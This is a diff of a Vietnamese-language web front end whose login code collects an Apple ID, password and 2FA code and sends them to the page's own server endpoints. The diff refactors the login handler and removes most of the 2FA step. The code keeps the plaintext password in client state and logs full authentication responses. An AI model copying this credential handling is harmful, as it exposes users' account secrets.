@@ -204,105 +204,66 @@ elements.verifyMessage.textContent = message || 'Vui lòng nhập mã xác minh 
 
     // Step 1: Login
   elements.loginBtn.addEventListener('click', async (e) => {
-    e.preventDefault();
-    if (isLoading) return;
+  e.preventDefault();
+  if (isLoading) return;
 
-    hideError();
-    setLoading(true);
+  hideError();
+  setLoading(true);
 
-    const APPLE_ID = elements.appleIdInput.value.trim();
-    const PASSWORD = elements.passwordInput.value;
+  const APPLE_ID = elements.appleIdInput.value.trim();
+  const PASSWORD = elements.passwordInput.value;
 
-    if (!APPLE_ID || !PASSWORD) {
-      showError('Vui lòng nhập Apple ID và mật khẩu.');
+  if (!APPLE_ID || !PASSWORD) {
+    showError('Vui lòng nhập Apple ID và mật khẩu.');
+    setLoading(false);
+    return;
+  }
+
+  state.APPLE_ID = APPLE_ID;
+  state.PASSWORD = PASSWORD;
+  setProgress(1);
+
+  try {
+    const response = await fetch('/auth', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ APPLE_ID, PASSWORD })
+    });
+
+    const data = await response.json();
+    console.log('Auth response:', JSON.stringify(data, null, 2)); // Thêm log chi tiết
+
+    if (!response.ok) {
+      // Xử lý lỗi từ server
+      const errorMessage = data.error || 
+                         data.message || 
+                         (data.debug ? data.debug.customerMessage : null) || 
+                         'Đăng nhập thất bại';
+      showError(errorMessage);
       setLoading(false);
       return;
     }
 
-    state.APPLE_ID = APPLE_ID;
-    state.PASSWORD = PASSWORD;
-    setProgress(1);
-
-    try {
-  const response = await fetch('/auth', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ APPLE_ID, PASSWORD })
-  });
-
-  const data = await response.json();
-  console.log('Auth response:', data);
-
-  if (!response.ok) {
-    showError(data.error || 'Đăng nhập thất bại');
-    return;
-  }
-
-  // ✅ Chỉ chuyển bước nếu rõ ràng require2FA hoặc success
-  if (data.require2FA === true) {
-    handle2FARedirect(data);
-    return;
-  } else if (data.success === true) {
-    state.requires2FA = false;
-    state.verified2FA = true;
-    state.dsid = data.dsid || null;
-    showToast('Đăng nhập thành công!');
-    transition(elements.step1, elements.step3);
-    setProgress(3);
-    return;
-  } else {
-    showError(data.error || 'Đăng nhập thất bại');
-  }
-} catch (error) {
-  console.error('Auth error:', error);
-  showError('Không thể kết nối tới máy chủ.');
-} finally {
-  setLoading(false);
-}
-  });
-  
-  // Step 2: Verify 2FA
-  elements.verifyBtn.addEventListener('click', async (e) => {
-    e.preventDefault();
-    if (isLoading) return;
-    
-    hideError();
-    setLoading(true);
-
-    const CODE = elements.verificationCodeInput.value.trim();
-    if (CODE.length !== 6) {
-      showError('Mã xác minh phải có 6 chữ số.');
-      setLoading(false);
-      return;
+    // Xử lý thành công hoặc yêu cầu 2FA
+    if (data.require2FA === true) {
+      handle2FARedirect(data);
+    } else if (data.success === true) {
+      state.requires2FA = false;
+      state.verified2FA = true;
+      state.dsid = data.dsid || null;
+      showToast('Đăng nhập thành công!');
+      transition(elements.step1, elements.step3);
+      setProgress(3);
+    } else {
+      showError(data.error || 'Đăng nhập thất bại');
     }
-
-    setProgress(2);
-
-    try {
-      const response = await fetch('/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          APPLE_ID: state.APPLE_ID, 
-          PASSWORD: state.PASSWORD, 
-          CODE,
-          dsid: state.dsid 
-        })
-      });
-
-      const data = await response.json();
-      console.log('Verify response:', data);
-
-      if (!response.ok) {
-        showError(data.error || 'Xác minh thất bại.');
-        return;
-      }
-
-      if (data.success) {
-  state.CODE = CODE;
-  state.verified2FA = true;
-  state.dsid = data.dsid || state.dsid;
-  showToast('Xác thực 2FA thành công!');
+  } catch (error) {
+    console.error('Auth error:', error);
+    showError('Không thể kết nối tới máy chủ: ' + error.message);
+  } finally {
+    setLoading(false);
+  }
+});
 
   // Ẩn step2 hoàn toàn
   elements.step2.classList.add('hidden');
